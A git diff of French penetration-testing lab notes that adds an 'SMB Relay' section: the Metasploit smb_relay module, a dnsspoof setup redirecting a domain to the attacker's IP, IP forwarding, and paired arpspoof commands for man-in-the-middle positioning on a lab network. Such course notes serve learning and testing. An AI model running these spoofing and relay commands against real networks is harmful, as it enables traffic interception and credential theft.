@@ -80,8 +80,24 @@ Cette analyse est la méthode la plus sûre pour identifier les ports ouverts. N
    - net use D: \\10.0.28.125\Documents  
    - net use K: \\10.0.28.125\K$  
 
-* Il ne rste plus qu'à se promener et regarder les flags.  
+* Il ne reste plus qu'à se promener et regarder les flags.  
 
 
+
+# SMB Relay
+
+Dans Metasploit, `search smb_relay` ou `use exploit/windows/smb/smb_relay`  
+SRVHOST et LHOST sont l'IP de l'attaquant (renseigner aussi la cible)  
+
+``echo "172.16.5.101 *.sportsfoo.com" > dns`` : crée un fichier "dns" qui contient l'IP de l'attaquant et le domaine cible.  
+
+``dnsspoof -i eth1 -f dns`` : lance une attaque de spoofing DNS sur l’interface réseau eth1. ("-f dns" utilise le fichier dns qui contient les fausses correspondances nom de domaine -> IP)  
+``echo 1 > /proc/sys/net/ipv4/ip_forward`` : Active le routage  
+A savoir, ici la gateway est 172.16.5.1  
+
+`arpspoof -i eth1 -t 172.16.5.5 172.16.5.1`  
+`arpspoof -i eth1 -t 172.16.5.1 172.16.5.5`  
+Ces deux commandes font une attaque ARP spoofing (ARP poisoning) pour se placer au milieu des communications. Tu dis à la victime (172.16.5.5) que la passerelle (172.16.5.1), c’est toi. Et tu dis à la passerelle que la victime, c’est toi.  
+On devient Man-In-The-Middle.  
 
 
